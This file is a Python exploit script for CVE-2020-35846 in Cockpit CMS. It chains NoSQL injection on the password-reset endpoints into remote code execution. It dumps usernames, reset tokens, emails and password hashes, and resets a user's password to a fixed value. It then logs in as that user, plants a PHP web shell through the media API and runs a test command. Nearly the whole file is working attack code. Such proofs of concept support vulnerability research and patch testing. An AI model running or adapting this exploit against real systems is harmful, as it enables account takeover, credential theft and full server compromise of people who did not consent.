import requests
import json
import re
import random
import string
import urllib
import argparse
import time


def dig_users(session , url):
    found = False
    users = []
    users_data = {
        "user" :   {
            "$func" : "var_dump"
        }
    }
    path = "/auth/requestreset"
    print("[*] Sending request to dump users.")
    users_req = session.post(url + path , json=users_data)
    if "string" in users_req.text:
        raw_users =  re.findall("string.*" , users_req.text)
        [users.append(line.split()[1].replace('\"' , '')) for line in raw_users]
        print(f"[+] Found Users : {users}")
        return users
    else:
        print("[-] Maybe the target isn't vulnerable.")
        quit()

def change_pass(session , url , user ,password , count=0 , reset=True):
    print(f"[+] Changing password of {user}")
    print("[*] Requesting for password reset token")
    request_data = {
        "user" : user
    }
    resetrequest = session.post(url + "/auth/requestreset" , json=request_data , proxies={"http" :"http://127.0.0.1:8080"})
    if "Invalid address:  (From): root@localhost" in resetrequest.text:
        token_data = {
            "token" : {
                "$func" : "var_dump"
            }
        }
        token_request = session.post(url + "/auth/resetpassword"  , json=token_data , proxies={"http" :"http://127.0.0.1:8080"})
        token = re.findall("string.*" , token_request.text)[count].split()[1].replace('\"' , "")
        print(f"[+] Found token for user {user} : {token}")

        print(f"[+] Dumping {user}'s data")
        hash_dump_data = {
            "token" : token
        }
        hash_dump_request = session.post(url + "/auth/newpassword" , json=hash_dump_data)
        lines = hash_dump_request.text.split("\n")
        raw_user_data = re.findall('this.user.*' , hash_dump_request.text)[0].split(" = ")
        user_info = json.loads(raw_user_data[1].replace(';' , ''))
        if reset:
            print(f"[+] Username : {user_info.get('user')}")
            print(f"[+] Email : {user_info.get('email')}")
            print(f"[+] Group : {user_info.get('group')}")
            print(f"[+] Hash : {user_info.get('password')}")
            print(f"[*] Resetting {user}'s password.")
            password_reset_data = {
                "token" : token,
                "password" : password
            }
            password_reset_request = session.post(url + "/auth/resetpassword" , json=password_reset_data)
            response = json.loads(password_reset_request.text)
            if response.get("success"):
                print("[+] Password reset succcessful")
                print(f"[+] New password of {user} : {password}")
                deploy_shell(session , url , user , password)
            else:
                print("[-] Can't reset the password.")
                quit()
        else:
            return user_info
    else:
        print("[-] Maybe the target isn't vulnerable.")
        quit()


def deploy_shell(session , url , user , password):
    print(f"[*] Logging in as {user}")
    csrf_request = session.get(url)
    csrf_token = re.findall("csfr.*" , csrf_request.text )[0].split(" : ")[1].replace("\"" , "")
    
    login_data = {
        "auth" : {
            "user" : user,
            "password" : password
        },
        "csfr" : csrf_token
    }
    login_req = session.post(url + "/auth/check" , json=login_data)
    if (json.loads(login_req.text).get("success")):
        print(f"[+] Successfully logged in as {user}")
        file_name = f"{''.join([random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for i in range(6)])}.php"
        create_file_data = {
            "cmd" : "createfile",
            "path" : "/",
            "name" : file_name
        }
        create_file_req = session.post(url + "/media/api" , json=create_file_data)
        if (json.loads(create_file_req.text).get("success")) == 0:
            file_contents_data = {
                "cmd" : "writefile",
                "path" : file_name,
                "content" : "<?php system($_GET['cmd']);?>"
            }
            file_contents_req = session.post(url + "/media/api" , json=file_contents_data)
            if (json.loads(file_contents_req.text).get("success")) == len(file_contents_data.get("content")):
                print(f"[+] Bingoo, File has been deployed successfully : {file_name}")
                time.sleep(1)
                print(f"[+] File's location : {url}/{file_name}")
                print(f"[*] Execution example : {url}/{file_name}?cmd=id")
                print(f'[+] Output : {requests.get(url + "/" + file_name + "?cmd=id").text.rstrip()}')
                print("[+] Good luck for Privilege Escalation :)")
                return file_name
        else:
            print("[-] File deployment failed. Maybe {user} doesn't have the permission to do so. :(")
            quit()
    else:
        print("[-] Login failed, Try Again.")
        quit()



def main():
    parser = argparse.ArgumentParser(description="""


_________                __           .__  __    ___________________ ___________
\_   ___ \  ____   ____ |  | ________ |__|/  |_  \______   \_   ___ \\_   _____/
/    \  \/ /  _ \_/ ___\|  |/ /\____ \|  \   __\  |       _/    \  \/ |    __)_ 
\     \___(  <_> )  \___|    < |  |_> >  ||  |    |    |   \     \____|        \
\n \______  /\____/ \___  >__|_ \|   __/|__||__|    |____|_  /\______  /_______  /
        \/            \/     \/|__|                      \/        \/        \/ 


        Cockpit CMS NoSQL Injection to Remote Code Execution : CVE-2020-35846
        Poc written by : 0z09e (https://github.com/0z09e)""" , formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("URL" , help="Target URL. Example : http://10.20.30.40/path/to/cockpit")
    parser.add_argument("--dump_all" , action='store_true' , default=False, help="Dump all the informations about each and every user.(No password will be changed and no shell will be deployed)")

    args = parser.parse_args()
    url = args.URL
    dump_all = args.dump_all

    password = "P@ssw0rd"


    if url[-1] == '/':
        url = url[:-1]


    print(f"[*] Target : {url}")
    session = requests.session()
    users = dig_users(session , url)
    if dump_all:
        users_data = []
        for user in users:
            custom_session = requests.session()
            users_data.append(change_pass(custom_session , url , user , password , count=users.index(user), reset=False))
            custom_session.close()
        print(f"<{'=' * 30} Informations {'=' * 30}>")
        for user_info in users_data:
            print(f"[+] Username : {user_info.get('user')}")
            print(f"[+] Email : {user_info.get('email')}")
            print(f"[+] Group : {user_info.get('group')}")
            print(f"[+] Hash : {user_info.get('password')}")
            print("\n")
            print("<-------------------------------------------------------------------------->")

    else:
        user = users[0]  # Changing the 0th user's password
        change_pass(session , url , user  , password ,  count=users.index(user))


if __name__ == "__main__":
    main()